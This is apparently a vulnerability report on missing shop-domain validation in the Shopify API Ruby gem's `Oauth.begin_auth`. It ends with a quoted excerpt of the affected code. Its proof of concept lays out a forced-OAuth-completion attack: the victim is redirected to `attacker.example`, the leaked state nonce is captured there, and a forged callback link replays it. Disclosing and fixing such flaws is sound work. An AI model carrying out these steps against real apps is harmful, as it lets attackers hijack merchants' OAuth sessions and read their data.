### Title
Missing Shop Domain Validation in `Oauth.begin_auth` Enables Forced OAuth Completion / State Leakage - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` builds the OAuth authorization redirect URL directly from the caller-supplied `shop` parameter without ever validating it against `ShopifyAPI::Utils::ShopValidator`, unlike every other credential-bearing OAuth flow in this gem (`TokenExchange`, `ClientCredentials`, `RefreshToken`), which all call `ShopValidator.sanitize!` before using a shop value to build a request host.

### Finding Description
`begin_auth` takes a `shop` argument and passes it unchecked into `auth_base_uri(shop)`: [1](#0-0) [2](#0-1) 

`auth_base_uri` only special-cases a dev-server suffix; otherwise it does `"https://#{shop}/admin"` with no domain restriction. The resulting `auth_route` (containing the app's `client_id` and a freshly generated `state` nonce) is returned to the caller to redirect the end-user's browser to, and the same `state` value is placed in a cookie: [3](#0-2) 

Contrast this with the sibling OAuth entry points in the same gem, which all sanitize the shop value before it is used to build a request host that will carry the app's `client_secret`: [4](#0-3) 

`grep` confirms `ShopValidator` is referenced in `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb`, but never in `oauth.rb`.

The security-relevant binding this breaks (an equality that must hold) is:
`redirect_host_the_browser_is_sent_to == a_trusted_*.myshopify.com/spin.dev/shop.dev_host`

Because `begin_auth` never enforces this, a host application that passes user-influenced input as `shop` (as the gem's own documentation demonstrates: `shop = request.headers["Shop"]` in `docs/usage/oauth.md`) will redirect the victim's browser — together with the `state` CSRF-nonce cookie value embedded in the URL query string — to an attacker-controlled host instead of Shopify.

Once the attacker's server has observed the leaked `state` value, the attacker (who can trivially obtain a legitimately-signed `code`/`hmac`/`shop` triple by going through the real OAuth flow with their own, attacker-owned Shopify store) can craft a callback URL to the victim app's real callback route using the leaked `state`. In `validate_auth_callback`, the only binding checked between the browser and the callback is the state-cookie comparison: [5](#0-4) 

Since the HMAC on the query only proves Shopify signed those exact parameters for the attacker's own shop — it does not prove the `state` value originated from that same user's initiated flow — if the victim's browser still holds the leaked `state` cookie (it was never overwritten, because the browser was redirected to the attacker's host, not Shopify), delivering this forged callback link to the victim completes an OAuth flow that binds the victim's app session to the attacker's Shopify store/access token (forced OAuth completion / session fixation).

### Impact Explanation
This is a session-fixation / forced-OAuth-completion vulnerability (High severity per rules): a merchant's app session can be bound to an attacker-controlled shop/access token, letting the attacker read data the victim subsequently enters into "their own" (attacker's) connected store context, or otherwise hijack the OAuth session. It also leaks the app's `client_id` and CSRF `state` nonce to an arbitrary attacker-chosen host — the exact identity-binding break called out in the rules ("host validated versus the host that receives the access token/`client_secret`", here specifically the host that receives the nonce meant only for Shopify).

### Likelihood Explanation
Exploitability depends on the host application passing attacker-influenceable input into `shop` for `begin_auth` — which the gem's own documented usage pattern encourages (`request.headers["Shop"]`). Given the gem consistently validates the shop domain in every *other* OAuth-adjacent flow (`TokenExchange`, `ClientCredentials`, `RefreshToken`) but omits it here, this is a genuine inconsistency in the library's own defense rather than solely a host-app mistake, making it a legitimate library-level gap.

### Recommendation
Call `ShopifyAPI::Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) at the start of `Oauth.begin_auth` (and re-validate `auth_query.shop` in `validate_auth_callback`) before it is used to construct `auth_base_uri`, matching the pattern already used in `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb`. Reject any `shop` value that is not a trusted Shopify domain before building any redirect or request URL.

### Proof of Concept
1. Host app route: `def login; shop = params[:shop]; ShopifyAPI::Auth::Oauth.begin_auth(shop: shop, redirect_path: "/auth/callback"); end` (mirrors the gem's documented example).
2. Attacker lures victim to `GET /login?shop=attacker.example`.
3. `begin_auth` returns `auth_route = "https://attacker.example/admin/oauth/authorize?client_id=...&state=<nonce>&..."`, and sets a `state` cookie with the same nonce in the victim's browser.
4. Victim's browser is redirected to `attacker.example`, leaking `client_id` and `state` to the attacker's server (instead of ever reaching Shopify).
5. Attacker separately performs a real OAuth grant for their own Shopify store against the same app to obtain a validly-HMAC-signed `code`/`shop`/`hmac` set.
6. Attacker sends the victim a link: `https://victim-app.com/auth/callback?code=<attacker_code>&shop=<attacker_shop>&state=<leaked_state>&hmac=<attacker_hmac>&host=...`.
7. Because the victim's browser still carries the original `state` cookie (never consumed by a real Shopify redirect), `validate_auth_callback`'s `state == auth_query.state` check passes, and the victim's app session becomes bound to the attacker's shop/access token.

            scope_override

            ShopifyAPI::Auth::AuthScopes.new(scope_override)

          end

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"
